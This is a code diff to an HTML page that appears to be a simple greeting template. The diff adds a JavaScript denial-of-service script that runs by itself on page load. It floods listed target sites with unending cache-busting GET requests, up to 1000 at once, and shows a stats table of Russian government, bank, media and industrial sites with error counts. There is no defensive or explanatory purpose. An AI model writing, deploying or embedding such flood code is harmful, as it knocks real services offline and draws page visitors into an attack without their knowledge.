@@ -1,9 +1,80 @@
 <!DOCTYPE html>
-<h1>
-    hello gjgw
-</h1>
 
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>!!</title>
+</head>
 
 <div>
     hello {{x1}}
 </div>
+
+
+<body data-new-gr-c-s-check-loaded="14.1050.0" data-gr-ext-installed="">
+  <h1>hello gjgw</h1>
+  
+  <div id="stats">
+      <table width="100%">
+          <thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody><tr><td>https://lenta.ru/</td><td>0</td><td>0</td></tr><tr><td>https://ria.ru/</td><td>0</td><td>0</td></tr><tr><td>https://ria.ru/lenta/</td><td>0</td><td>0</td></tr><tr><td>https://www.rbc.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.rt.com/</td><td>0</td><td>0</td></tr><tr><td>http://kremlin.ru/</td><td>0</td><td>1157</td></tr><tr><td>http://en.kremlin.ru/</td><td>0</td><td>0</td></tr><tr><td>https://smotrim.ru/</td><td>0</td><td>0</td></tr><tr><td>https://tass.ru/</td><td>0</td><td>0</td></tr><tr><td>https://tvzvezda.ru/</td><td>0</td><td>0</td></tr><tr><td>https://vsoloviev.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.1tv.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.vesti.ru/</td><td>0</td><td>0</td></tr><tr><td>https://online.sberbank.ru/</td><td>0</td><td>0</td></tr><tr><td>https://sberbank.ru/</td><td>0</td><td>0</td></tr><tr><td>https://zakupki.gov.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.gosuslugi.ru/</td><td>0</td><td>0</td></tr><tr><td>https://er.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.rzd.ru/</td><td>0</td><td>0</td></tr><tr><td>https://rzdlog.ru/</td><td>0</td><td>0</td></tr><tr><td>https://vgtrk.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.interfax.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.mos.ru/uslugi/</td><td>0</td><td>0</td></tr><tr><td>http://government.ru/</td><td>0</td><td>0</td></tr><tr><td>https://mil.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.nalog.gov.ru/</td><td>0</td><td>0</td></tr><tr><td>https://customs.gov.ru/</td><td>0</td><td>0</td></tr><tr><td>https://pfr.gov.ru/</td><td>0</td><td>0</td></tr><tr><td>https://rkn.gov.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.gazprombank.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.vtb.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.gazprom.ru/</td><td>0</td><td>0</td></tr><tr><td>https://lukoil.ru</td><td>0</td><td>0</td></tr><tr><td>https://magnit.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.nornickel.com/</td><td>0</td><td>0</td></tr><tr><td>https://www.surgutneftegas.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.tatneft.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.evraz.com/ru/</td><td>0</td><td>0</td></tr><tr><td>https://nlmk.com/</td><td>0</td><td>0</td></tr><tr><td>https://www.sibur.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.severstal.com/</td><td>0</td><td>0</td></tr><tr><td>https://www.metalloinvest.com/</td><td>0</td><td>0</td></tr><tr><td>https://nangs.org/</td><td>0</td><td>0</td></tr><tr><td>https://rmk-group.ru/ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.tmk-group.ru/</td><td>0</td><td>0</td></tr><tr><td>https://ya.ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.polymetalinternational.com/ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.uralkali.com/ru/</td><td>0</td><td>0</td></tr><tr><td>https://www.eurosib.ru/</td><td>0</td><td>0</td></tr><tr><td>https://ugmk.ua/</td><td>0</td><td>0</td></tr><tr><td>https://omk.ru/</td><td>0</td><td>0</td></tr></tbody></table></div>
+
+<script>
+var targets = {
+    'https://www.hfdjkfhdskfh.com': {number_of_requests: 0, number_of_errored_responses : 0},
+    'http://belres.by/ru/': {number_of_requests: 0, number_of_errored_responses : 0},
+}
+
+var statsEl = document.getElementById('stats');
+function printStats() {
+  statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+}
+setInterval(printStats, 2000);
+
+var CONCURRENCY_LIMIT = 1000
+var queue = []
+
+async function fetchWithTimeout(resource, options) {
+  const controller = new AbortController();
+  const id = setTimeout(() => controller.abort(), options.timeout);
+  return fetch(resource, {
+    method: 'GET',
+    mode: 'no-cors',
+    signal: controller.signal
+  }).then((response) => {
+    clearTimeout(id);
+    return response;
+  }).catch((error) => {
+    clearTimeout(id);
+    throw error;
+  });
+}
+
+async function flood(target) {
+  for (var i = 0;; ++i) {
+    if (queue.length > CONCURRENCY_LIMIT) {
+      await queue.shift()
+    }
+    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+    queue.push(
+      fetchWithTimeout(target+rand, { timeout: 1000 })
+        .catch((error) => {
+          if (error.code === 20 /* ABORT */) {
+            return;
+          }
+          targets[target].number_of_errored_responses++;
+        })
+        .then((response) => {
+          if (response && !response.ok) {
+            targets[target].number_of_errored_responses++;
+          }
+          targets[target].number_of_requests++;
+        })
+
+    )
+  }
+}
+
+// Start
+Object.keys(targets).map(flood)
+</script>
+
+</body>
